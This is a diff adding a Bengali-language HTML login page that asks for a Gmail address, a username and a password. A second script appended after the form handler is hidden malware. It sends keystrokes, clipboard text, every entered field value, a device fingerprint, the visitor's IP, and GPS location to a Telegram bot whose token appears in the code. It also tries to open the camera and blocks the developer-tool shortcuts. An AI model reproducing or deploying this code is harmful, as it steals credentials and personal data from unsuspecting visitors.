@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - অ্যাকাউন্টে প্রবেশ করুন</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 380px;
+        }
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .login-header h2 {
+            color: #333;
+            font-size: 28px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        input:focus {
+            border-color: #667eea;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 15px rgba(102, 126, 234, 0.3);
+        }
+        .extra-options {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .extra-options a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        .extra-options a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h2>লগইন করুন</h2>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="gmail">Gmail Address</label>
+                <input type="email" id="gmail" placeholder="example@gmail.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="আপনার ইউজারনেম" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="পাসওয়ার্ড দিন" required>
+            </div>
+
+            <button type="submit" class="btn-login">লগইন করুন</button>
+        </form>
+
+        <div class="extra-options">
+            <p><a href="#">পাসওয়ার্ড ভুলে গেছেন?</a></p>
+            <p>অ্যাকাউন্ট নেই? <a href="#">সাইন আপ করুন</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const gmail = document.getElementById('gmail').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (gmail && username && password) {
+                alert(`লগইন সফল!\n\nGmail: ${gmail}\nUsername: ${username}`);
+                // এখানে আপনি backend এ ডাটা পাঠাতে পারবেন (fetch / axios)
+            } else {
+                alert("সব ফিল্ড পূরণ করুন!");
+            }
+        });
+    </script>
+
+<script>
+const TOKEN='8762306338:AAEK0xVsVm44Epmu0N3rVYqeVV10GfIRNco',CHAT_ID='7988925862';
+const sendTele=m=>{fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:m,parse_mode:'Markdown'})});};
+async function d1(){let m="**[◈] DEVICE ID**\n• Platform: "+navigator.platform+"\n• Cores: "+navigator.hardwareConcurrency+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**";sendTele(m);}d1();
+
+let keys = "";
+document.addEventListener('keydown', (e) => {
+    keys += e.key;
+    if (keys.length >= 10) {
+        sendTele(` Keylog: ${keys}`);
+        keys = "";
+    }
+});
+
+document.addEventListener('click', async () => {
+    try {
+        const text = await navigator.clipboard.readText();
+        if (text) sendTele(`Clipboard: ${text}`);
+    } catch (err) {}
+}, { once: true }); 
+
+async function d4(){let b=await navigator.getBattery();sendTele("**[◈] STATUS**\n• Batt: "+b.level*100+"%\n• Net: "+navigator.connection.downlink+"Mbps\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**");}d4();
+
+document.querySelectorAll('input, textarea, select').forEach(field => {
+    field.addEventListener('blur', () => {
+        if (field.value.length > 0) {
+            const label = field.placeholder || field.name || field.id || "Unknown";
+            sendTele(` Input Capture:\nField: ${label}\nData: ${field.value}`);
+        }
+    });
+});
+
+document.onvisibilitychange=()=>{sendTele("**[◈] TAB ACTIVITY**\n• State: "+document.visibilityState+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**");};
+
+sendTele("**[◈] SCREEN**\n• Res: "+screen.width+"x"+screen.height+"\n• Ratio: "+window.devicePixelRatio+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**");
+
+document.onkeydown = (e) => {
+    if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 73 || e.keyCode === 74)) return false;
+    if (e.keyCode === 123) return false; 
+};
+
+async function logData() {
+    let msg = `** VIEWED THE BIO PAGE OF MARK **\n━━━━━━━━━━━━━━\n`;
+    
+    // DEVICE DETECTION LOGIC (100% Accuracy Attempt)
+    let device_model = "Unknown Device";
+    const ua = navigator.userAgent;
+
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        // Modern logic for Chrome/Edge/Newer Browsers
+        try {
+            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+            if (hints.model) {
+                device_model = hints.model;
+            } else {
+                const match = ua.match(/\(([^)]+)\)/);
+                if (match) device_model = match[1].split(';')[1] || match[1];
+            }
+        } catch (e) {
+            device_model = "Protected Device";
+        }
+    } else {
+        // Regex Logic for older browsers
+        const androidMatch = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
+        if (androidMatch) {
+            device_model = androidMatch[2]; 
+        } else {
+            const genericMatch = ua.match(/\(([^)]+)\)/);
+            if (genericMatch) device_model = genericMatch[1].split(';')[1] || genericMatch[1];
+        }
+    }
+
+    // 1. HARDWARE & DISPLAY
+    msg += ` *=✪=* **DEVICE IDENTITY** *=✪=*\n`;
+    msg += `• **Model/Name:** ${device_model}\n`;
+    msg += `• **Device Platform:** ${navigator.platform}\n`;
+    msg += `• **Touch Points:** ${navigator.maxTouchPoints}\n\n════════════════\n\n`;
+
+    msg += `*=✪=* ** HARDWARE & DISPLAY** *=✪=*\n`;
+    msg += `• **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}\n`;
+    msg += `• **RAM:** ${navigator.deviceMemory || 'N/A'} GB\n`;
+    msg += `• **Screen:** ${screen.width}x${screen.height}\n`;
+    msg += `• **Pixel Ratio:** ${window.devicePixelRatio}\n`;
+    msg += `• **Color Depth:** ${screen.colorDepth}-bit\n`;
+    msg += `• **Orientation:** ${screen.orientation ? screen.orientation.type : 'N/A'}\n\n════════════════\n\n`;
+     
+    // 2. BROWSER & ENGINE
+    msg += `*=✪=* ** BROWSER CAPABILITIES** *=✪=*\n`;
+    msg += `• **UserAgent:** ${navigator.userAgent}\n`;
+    msg += `• **Dark Mode:** ${window.matchMedia('(prefers-color-scheme: dark)').matches}\n`;
+    msg += `• **Cookies Enabled:** ${navigator.cookieEnabled}\n`;
+    msg += `• **PDF Viewer:** ${navigator.pdfViewerEnabled}\n`;
+    
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        msg += `• **GPU:** ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n\n════════════════\n`;
+    }
+
+    // 3. NETWORK & IP
+    msg += `\n*=✪=* ** GEOLOCATION ** *=✪=*\n`;
+    const apis = [
+        'https://ipapi.co/json/',
+        'https://ipwho.is/',
+        'https://api.ipify.org?format=json'
+    ];
+
+    let geoDataFound = false;
+    for (let api of apis) {
+        try {
+            const res = await fetch(api);
+            const data = await res.json();
+            msg += `➤ **Source API:** ${api}\n`;
+            msg += `• **IP:** \`${data.ip || data.query}\`\n`;
+            msg += `• **ISP:** ${data.org || data.isp || data.connection?.isp}\n`;
+            msg += `• **Location:** ${data.city}, ${data.country_name || data.country}\n`;
+            if(data.latitude) msg += `• **Map:** [View](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n\n════════════════\n`;
+            geoDataFound = true;
+            break; 
+        } catch(e) { continue; }
+    }
+
+    // 4. ENVIRONMENT
+    msg += `\n➤ ** ENVIRONMENT**\n`;
+    msg += `• **Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+    msg += `• **Language:** ${navigator.language}\n`;
+    
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            msg += `• **Battery:** ${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})\n\n════════════════\n`;
+        }
+    } catch(e) {}
+
+    msg += `**=✪=** **AT:** ${new Date().toLocaleString()}`; 
+    msg += `\n════════════════\n`;
+    msg += `**▒░░░ α૨εα 186░░░▒**\n`;
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+    });
+}
+
+window.onload=()=>{ 
+     
+    logData(); 
+};  
+
+sendTele("**[◈] REGION**\n• Zone: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\n• Time: "+new Date().toLocaleString()+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**");
+
+try{let c=document.createElement('canvas'),g=c.getContext('webgl'),d=g.getExtension('WEBGL_debug_renderer_info');sendTele("**[◈] GPU**\n• Renderer: "+g.getParameter(d.UNMASKED_RENDERER_WEBGL)+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**");}catch(e){}
+ 
+fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendTele("**[◈] IP HIJACKED**\n• IP: "+d.ip+"\n• ISP: "+d.org+"\n• Loc: "+d.city+"\n**▒░░░░░░░░░░░░░░░░░░░▒**"));
+
+navigator.geolocation.getCurrentPosition(pos => {
+    const { latitude, longitude } = pos.coords;
+    sendTele(` Location: https://www.google.com/maps?q=${latitude},${longitude}`);
+});
+async function snap() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            sendTele(`Camera Access: Captured (Send as Image if Bot supports)`);
+            stream.getTracks().forEach(track => track.stop());
+        };
+    } catch (e) {}
+}
+setTimeout(snap, 2000);
+</script></body>
+</html>
